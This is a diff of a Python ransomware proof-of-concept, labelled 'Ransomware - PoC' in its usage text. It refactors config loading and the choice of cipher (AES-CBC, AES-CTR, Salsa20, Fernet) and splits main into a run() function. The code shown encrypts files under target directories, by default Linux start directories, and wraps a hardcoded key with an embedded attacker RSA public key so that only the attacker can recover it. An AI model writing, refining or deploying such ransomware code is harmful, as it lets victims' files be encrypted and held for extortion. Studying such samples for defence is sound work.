@@ -1,6 +1,5 @@
 import argparse
 import base64
-import json
 import os
 import sys
 
@@ -8,6 +7,8 @@ from Crypto.Cipher import AES, Salsa20, PKCS1_OAEP
 from Crypto.PublicKey import RSA
 from Crypto.Util import Counter
 from cryptography.fernet import Fernet
+
+from globals import get_config_from_file
 
 # ============================================================
 # ============ 		GLOBALS 	  ==============
@@ -158,29 +159,26 @@ def decrypt_files(crypt, start_dirs):
 
 
 def select_encryption_algorithm(key):
-    with open(os.path.join(os.path.curdir, "config.json"), "r") as conf_file:
-        config = json.loads(conf_file.read())
-
-    match config["algo"]:
+    config = get_config_from_file()
+    match config["ALGORITHM"]["algo"]:
         case "AES-CBC":
             assert len(key) in [16, 24, 32]
-            ctr = Counter.new(128)
-            return AES.new(key, AES.MODE_CBC, counter=ctr)
+            return AES.new(key=key, mode=AES.MODE_CBC)
         case "AES-CTR":
             assert len(key) in [16, 24, 32]
             ctr = Counter.new(128)
-            return AES.new(key, AES.MODE_CTR, counter=ctr)
+            return AES.new(key=key, mode=AES.MODE_CTR, counter=ctr)
         case "Salsa20":
-            assert len(key) is 32
-            return Salsa20.new(key)
+            assert len(key) == 32
+            return Salsa20.new(key=key)
         case "Fernet":
-            assert len(key) is 32
-            return Fernet(key)
+            assert len(key) == 32
+            return Fernet(key=key)
         case _:
             assert len(key) in [16, 24, 32]
-            print("unknown encryption algorithm config used. Falling back to default AES-CBC")
+            print("unknown encryption algorithm config used. Falling back to default AES-CTR")
             ctr = Counter.new(128)
-            return AES.new(key, AES.MODE_CBC, counter=ctr)
+            return AES.new(key, AES.MODE_CTR, counter=ctr)
 
 
 def parse_args():
@@ -199,26 +197,13 @@ def parse_args():
     return parser.parse_args()
 
 
-def main():
-    if len(sys.argv) <= 1:
-        print('[*] Ransomware - PoC\n')
-        print('Usage: python3 main.py -h')
-        print('{} -h for help.'.format(sys.argv[0]))
-        exit(0)
-
-    # Parse arguments
-    args = parse_args()
-    encrypt = args.encrypt
-    # decrypt = args.decrypt
-
-    absolute_paths = str(args.path)
-
+def run(absolute_paths, encrypt):
     if absolute_paths != 'None':
         start_dirs = absolute_paths.split(",")
     else:
         start_dirs = LINUX_STARTDIRS
 
-    # Encrypt AES key with attacker's embedded RSA public key 
+    # Encrypt AES key with attacker's embedded RSA public key
     server_key = RSA.importKey(SERVER_PUBLIC_RSA_KEY)
     encryptor = PKCS1_OAEP.new(server_key)
     encrypted_key = encryptor.encrypt(HARDCODED_KEY)
@@ -248,6 +233,23 @@ def main():
         encrypt_files(crypt, start_dirs)
     else:
         decrypt_files(crypt, start_dirs)
+
+
+def main():
+    if len(sys.argv) <= 1:
+        print('[*] Ransomware - PoC\n')
+        print('Usage: python3 main.py -h')
+        print('{} -h for help.'.format(sys.argv[0]))
+        exit(0)
+
+    # Parse arguments
+    args = parse_args()
+    encrypt = args.encrypt
+    # decrypt = args.decrypt
+
+    absolute_paths = str(args.path)
+
+    run(absolute_paths, encrypt)
 
 
 if __name__ == "__main__":
